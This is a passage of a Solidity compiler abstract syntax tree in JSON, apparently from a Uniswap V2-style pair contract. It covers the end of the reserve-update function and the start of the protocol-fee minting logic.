																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 1221,
																								"name": "_reserve0",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1153,
																								"src": "3582:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 1219,
																								"name": "UQ112x112",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 2310,
																								"src": "3565:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_contract$_UQ112x112_$2310_$",
																									"typeString": "type(library UQ112x112)"
																								}
																							},
																							"id": 1220,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "encode",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2291,
																							"src": "3565:16:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint112_$returns$_t_uint224_$",
																								"typeString": "function (uint112) pure returns (uint224)"
																							}
																						},
																						"id": 1222,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "3565:27:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint224",
																							"typeString": "uint224"
																						}
																					},
																					"id": 1223,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "uqdiv",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2309,
																					"src": "3565:33:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint224_$_t_uint112_$returns$_t_uint224_$bound_to$_t_uint224_$",
																						"typeString": "function (uint224,uint112) pure returns (uint224)"
																					}
																				},
																				"id": 1225,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "3565:44:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			],
																			"id": 1218,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "3560:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint256_$",
																				"typeString": "type(uint256)"
																			},
																			"typeName": "uint"
																		},
																		"id": 1226,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "3560:50:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "*",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 1227,
																		"name": "timeElapsed",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1187,
																		"src": "3629:11:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint32",
																			"typeString": "uint32"
																		}
																	},
																	"src": "3560:80:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3520:120:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1230,
															"nodeType": "ExpressionStatement",
															"src": "3520:120:6"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1237,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1233,
														"name": "reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 974,
														"src": "3660:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1235,
																"name": "balance0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "3679:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 1234,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "3671:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint112_$",
																"typeString": "type(uint112)"
															},
															"typeName": "uint112"
														},
														"id": 1236,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3671:17:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "3660:28:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1238,
												"nodeType": "ExpressionStatement",
												"src": "3660:28:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1243,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1239,
														"name": "reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 976,
														"src": "3698:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1241,
																"name": "balance1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1151,
																"src": "3717:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 1240,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "3709:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint112_$",
																"typeString": "type(uint112)"
															},
															"typeName": "uint112"
														},
														"id": 1242,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3709:17:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "3698:28:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1244,
												"nodeType": "ExpressionStatement",
												"src": "3698:28:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1247,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1245,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 978,
														"src": "3736:18:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1246,
														"name": "blockTimestamp",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1176,
														"src": "3757:14:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "3736:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"id": 1248,
												"nodeType": "ExpressionStatement",
												"src": "3736:35:6"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1250,
															"name": "reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 974,
															"src": "3791:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1251,
															"name": "reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 976,
															"src": "3801:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1249,
														"name": "Sync",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1108
														],
														"referencedDeclaration": 1108,
														"src": "3786:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint112,uint112)"
														}
													},
													"id": 1252,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3786:24:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1253,
												"nodeType": "EmitStatement",
												"src": "3781:29:6"
											}
										]
									},
									"documentation": null,
									"id": 1255,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_update",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1156,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1149,
												"name": "balance0",
												"nodeType": "VariableDeclaration",
												"scope": 1255,
												"src": "2860:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1148,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2860:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1151,
												"name": "balance1",
												"nodeType": "VariableDeclaration",
												"scope": 1255,
												"src": "2883:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1150,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2883:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1153,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1255,
												"src": "2906:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1152,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2906:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1155,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1255,
												"src": "2933:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1154,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2933:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2850:106:6"
									},
									"returnParameters": {
										"id": 1157,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2965:0:6"
									},
									"scope": 2193,
									"src": "2834:983:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1366,
										"nodeType": "Block",
										"src": "4010:786:6",
										"statements": [
											{
												"assignments": [
													1265
												],
												"declarations": [
													{
														"constant": false,
														"id": 1265,
														"name": "feeTo",
														"nodeType": "VariableDeclaration",
														"scope": 1366,
														"src": "4020:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1264,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "4020:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1271,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1267,
																	"name": "factory",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 966,
																	"src": "4045:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1266,
																"name": "IFactory",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 601,
																"src": "4036:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IFactory_$601_$",
																	"typeString": "type(contract IFactory)"
																}
															},
															"id": 1268,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4036:17:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IFactory_$601",
																"typeString": "contract IFactory"
															}
														},
														"id": 1269,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "feeTo",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 550,
														"src": "4036:23:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
															"typeString": "function () view external returns (address)"
														}
													},
													"id": 1270,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4036:25:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4020:41:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1278,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1272,
														"name": "feeOn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1262,
														"src": "4071:5:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"id": 1277,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1273,
															"name": "feeTo",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1265,
															"src": "4079:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1275,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4096:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 1274,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "4088:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1276,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4088:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"src": "4079:19:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "4071:27:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1279,
												"nodeType": "ExpressionStatement",
												"src": "4071:27:6"
											},
											{
												"assignments": [
													1281
												],
												"declarations": [
													{
														"constant": false,
														"id": 1281,
														"name": "_kLast",
														"nodeType": "VariableDeclaration",
														"scope": 1366,
														"src": "4108:11:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1280,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4108:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1283,
												"initialValue": {
													"argumentTypes": null,
													"id": 1282,
													"name": "kLast",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 984,
													"src": "4122:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4108:19:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1284,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1262,
													"src": "4156:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1358,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1356,
															"name": "_kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1281,
															"src": "4743:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1357,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4753:1:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "4743:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 1364,
													"nodeType": "IfStatement",
													"src": "4739:51:6",
													"trueBody": {
														"id": 1363,
														"nodeType": "Block",
														"src": "4756:34:6",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 1361,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 1359,
																		"name": "kLast",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 984,
																		"src": "4770:5:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 1360,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "4778:1:6",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	},
																	"src": "4770:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1362,
																"nodeType": "ExpressionStatement",
																"src": "4770:9:6"
															}
														]
													}
												},
												"id": 1365,
												"nodeType": "IfStatement",
												"src": "4152:638:6",
												"trueBody": {
													"id": 1355,
													"nodeType": "Block",
													"src": "4163:570:6",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1287,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1285,
																	"name": "_kLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1281,
																	"src": "4181:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1286,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4191:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4181:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 1354,
															"nodeType": "IfStatement",
															"src": "4177:546:6",
															"trueBody": {
																"id": 1353,
																"nodeType": "Block",
																"src": "4194:529:6",
																"statements": [
																	{
																		"assignments": [
																			1289
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1289,
																				"name": "rootK",
																				"nodeType": "VariableDeclaration",
																				"scope": 1353,
																				"src": "4212:10:6",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1288,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "4212:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1299,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1296,
																							"name": "_reserve1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1259,
																							"src": "4255:9:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint112",
																								"typeString": "uint112"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint112",
																								"typeString": "uint112"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 1293,
																									"name": "_reserve0",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 1257,
																									"src": "4240:9:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint112",
																										"typeString": "uint112"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_uint112",
																										"typeString": "uint112"
																									}
																								],
																								"id": 1292,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "4235:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint256_$",
																									"typeString": "type(uint256)"
																								},
																								"typeName": "uint"
																							},
																							"id": 1294,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "4235:15:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1295,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2267,
																						"src": "4235:19:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 1297,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "4235:30:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1290,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "4225:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1291,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "4225:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1298,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4225:41:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "4212:54:6"
																	},
																	{
																		"assignments": [
																			1301
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1301,
																				"name": "rootKLast",
																				"nodeType": "VariableDeclaration",
																				"scope": 1353,
																				"src": "4284:14:6",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1300,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "4284:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1306,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1304,
																					"name": "_kLast",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1281,
																					"src": "4311:6:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1302,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "4301:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1303,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "4301:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1305,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4301:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "4284:34:6"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
